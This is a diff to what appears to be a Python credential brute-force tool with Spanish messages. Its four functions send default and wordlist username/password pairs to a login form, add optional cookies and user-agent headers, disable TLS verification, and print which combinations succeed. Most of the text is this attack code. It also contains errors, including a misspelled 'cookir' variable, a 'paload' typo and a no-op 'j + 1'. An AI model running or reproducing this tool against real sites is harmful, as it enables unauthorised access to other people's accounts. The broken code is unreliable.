@@ -16,70 +16,70 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message, ver
 	requests.packages.urllib3.disable_warnings()		
 	
 	payadm1 = {userField: '', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm1 = requests.post(url,payadm1, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
 	
 	payadm2 = {userField: '1', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm2 = requests.post(url,payadm2, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
 	
 	
 	payadm3 = {userField: '12', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm3 = requests.post(url,payadm3, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
 	
 	payload = { userField : user, passField: pwd}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		r = requests.post(url,payload, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		r = requests.post(url,payload,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		r = requests.post(url,payload, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		r = requests.post(url,payload, cookies = cookies, headers = headers, verify=False)
@@ -139,52 +139,52 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 	requests.packages.urllib3.disable_warnings()		
 	
 	payadm1 = {userField: '', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm1 = requests.post(url,payadm1, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
 	
 	payadm2 = {userField: '1', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm2 = requests.post(url,payadm2, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
 	
 	payadm3 = {userField: '12', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm3 = requests.post(url,payadm3, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
@@ -200,18 +200,18 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 				
 			#Login
 			payload = { userField : users[i].rstrip('\n'), passField: pwd}
-			if len(cookie) == 0 and len(agent) == 0:
+			if cookie is None and agent is None:
 				r = requests.post(url,data = payload, verify=False)
 		
-			elif len(cookie) == 0 and len(agent) > 0:
+			elif cookie is None and agent is not None:
 				headers = {'user-agent': agent}
 				r = requests.post(url,data = payload,headers = headers, verify=False)
 			
-			elif len(cookie) > 0 and len(agent) == 0:
+			elif cookie is not None and agent is None:
 				cookies = dict(cookies_are=cookie) 
 				r = requests.post(url,data = payload, cookies = cookies, verify=False)
 		
-			elif len(cookie) > 0  and len(agent) > 0:
+			elif cookie is not None and agent is not None:
 				headers = {'user-agent': agent}
 				cookies = dict(cookies_are=cookie) 
 				r = requests.post(url,data = paload, cookies = cookies, headers = headers, verify=False)
@@ -272,52 +272,52 @@ def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ver
 	requests.packages.urllib3.disable_warnings()		
 	
 	payadm1 = {userField: '', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm1 = requests.post(url,payadm1, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
 	
 	payadm2 = {userField: '1', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm2 = requests.post(url,payadm2, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
 	
 	payadm3 = {userField: '12', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm3 = requests.post(url,payadm3, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
@@ -334,18 +334,18 @@ def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ver
 		
 			#Login
 			payload = { userField : user, passField: passwords[i].rstrip('\n')}
-			if len(cookie) == 0 and len(agent) == 0:
+			if cookie is None and agent is None:
 				r = requests.post(url,data = payload, verify=False)
 		
-			elif len(cookie) == 0 and len(agent) > 0:
+			elif cookie is None and agent is not None:
 				headers = {'user-agent': agent}
 				r = requests.post(url,data = payload,headers = headers, verify=False)
 		
-			elif len(cookie) > 0 and len(agent) == 0:
+			elif cookie is not None and agent is None:
 				cookies = dict(cookies_are=cookie) 
 				r = requests.post(url,data = payload, cookies = cookies, verify=False)
 		
-			elif len(cookie) > 0  and len(agent) > 0:
+			elif cookie is not None and agent is not None:
 				headers = {'user-agent': agent}
 				cookies = dict(cookies_are=cookie) 
 				r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
@@ -409,52 +409,52 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 	requests.packages.urllib3.disable_warnings()		
 	
 	payadm1 = {userField: '', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm1 = requests.post(url,payadm1, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
 	
 	payadm2 = {userField: '1', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm2 = requests.post(url,payadm2, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookie is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
 	
 	payadm3 = {userField: '12', passField: ''}
-	if len(cookie) == 0 and len(agent) == 0:
+	if cookie is None and agent is None:
 		reqadm3 = requests.post(url,payadm3, verify=False)
 		
-	elif len(cookie) == 0 and len(agent) > 0:
+	elif cookie is None and agent is not None:
 		headers = {'user-agent': agent}
 		reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
 		
-	elif len(cookie) > 0 and len(agent) == 0:
+	elif cookir is not None and agent is None:
 		cookies = dict(cookies_are=cookie) 
 		reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
 		
-	elif len(cookie) > 0  and len(agent) > 0:
+	elif cookie is not None and agent is not None:
 		headers = {'user-agent': agent}
 		cookies = dict(cookies_are=cookie) 
 		reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
@@ -479,18 +479,18 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 				#Login
 				
 				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
-				if len(cookie) == 0 and len(agent) == 0:
+				if cookie is None and agent is None:
 					r = requests.post(url,data = payload, verify=False)
 		
-				elif len(cookie) == 0 and len(agent) > 0:
+				elif cookie is None and agent is not None:
 					headers = {'user-agent': agent}
 					r = requests.post(url,data = payload,headers = headers, verify=False)
 		
-				elif len(cookie) > 0 and len(agent) == 0:
+				elif cookie is not None and agent is None:
 					cookies = dict(cookies_are=cookie) 
 					r = requests.post(url,data = payload, cookies = cookies, verify=False)
 		
-				elif len(cookie) > 0  and len(agent) > 0:
+				elif cookie is not None and agent is not None:
 					headers = {'user-agent': agent}
 					cookies = dict(cookies_are=cookie) 
 					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
@@ -532,7 +532,7 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
 						elif int(verbose) == 3:
 							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
-						j + 1
+						j + 1	
 				else: # Si no se puede determinar mediante content-lenght
 					if mbefore in r.text:
 						if int(verbose) == 1:
